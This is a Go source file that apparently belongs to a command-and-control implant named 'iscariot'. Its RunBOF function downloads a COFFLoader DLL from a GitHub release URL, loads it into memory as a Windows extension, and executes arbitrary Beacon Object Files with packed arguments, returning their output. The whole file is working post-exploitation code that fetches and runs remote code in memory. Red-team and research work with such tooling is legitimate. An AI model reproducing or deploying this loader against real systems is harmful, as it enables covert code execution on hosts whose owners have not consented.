package bof

import (
	"bytes"
	"iscariot/extension"
	"log"
	"runtime"

	utils "iscariot/utils"
)

const (
	coffLoaderName   = "coff-loader"
	loaderEntryPoint = "LoadAndRun"
	bofEntryPoint    = "go"
)

type BofArgs struct {
	ArgType string      `json:"type"`
	Value   interface{} `json:"value"`
}

func RunBOF(bof []byte, args []BofArgs) (output string, err error) {
	var outputBytes []byte

	// Check if we have the COFFLoader in memory already
	currentExtensions := extension.List()
	if !utils.Contains(currentExtensions, coffLoaderName) {
		var coffLoaderFileName, arch string

		if runtime.GOARCH == "amd64" {
			coffLoaderFileName = "COFFLoader.x64.dll"
			arch = "amd64"
		} else {
			coffLoaderFileName = "COFFLoader.x86.dll"
			arch = "386"
		} // ARM is out of luck, sorry

		loaderData, err := utils.UntarFileFromURL("https://github.com/sliverarmory/COFFLoader/releases/download/v1.0.13/coff-loader.tar.gz", coffLoaderFileName)
		// loaderData, err := utils.LoadFileFromDisk(coffLoaderFileName)
		if err != nil {
			log.Println("Error getting coff loader: " + err.Error())
			return "", err
		}

		coffLoader := extension.NewWindowsExtension(loaderData, coffLoaderName, arch, loaderEntryPoint)
		extension.Add(coffLoader)
		err = coffLoader.Load()
		if err != nil {
			log.Println("Error in coff loader loading: " + err.Error())
			return "", err
		}
	}
	// Process the arguments
	bofArgs := BOFArgsBuffer{
		Buffer: new(bytes.Buffer),
	}
	for _, a := range args {
		switch a.ArgType {
		case "int":
			if v, ok := a.Value.(float64); ok {
				err = bofArgs.AddInt(uint32(v))
			}
		case "string":
			if v, ok := a.Value.(string); ok {
				err = bofArgs.AddString(v)
			}
		case "wstring":
			if v, ok := a.Value.(string); ok {
				err = bofArgs.AddWString(v)
			}
		case "short":
			if v, ok := a.Value.(float64); ok {
				err = bofArgs.AddShort(uint16(v))
			}
		}
		if err != nil {
			return
		}
	}

	extArgs := BOFArgsBuffer{
		Buffer: new(bytes.Buffer),
	}

	parsedArgs, err := bofArgs.GetBuffer()
	if err != nil {
		return
	}

	err = extArgs.AddString(bofEntryPoint)
	if err != nil {
		return
	}
	err = extArgs.AddData(bof)
	if err != nil {
		return
	}
	err = extArgs.AddData(parsedArgs)
	if err != nil {
		return
	}
	extArgsBuffer, err := extArgs.GetBuffer()
	if err != nil {
		return
	}

	gotOutput := false

	err = extension.Run(coffLoaderName, loaderEntryPoint, extArgsBuffer, func(out []byte) {
		gotOutput = true
		outputBytes = out
	})
	if err != nil || !gotOutput {
		// Some BOFs, such as dir return an error of "There are no more files." along with output
		// If there is data in outputBytes, send that back instead of the error
		if err != nil && len(outputBytes) == 0 {
			return "", err
		}
	}
	outputString := string(outputBytes[:])

	return outputString, nil
}
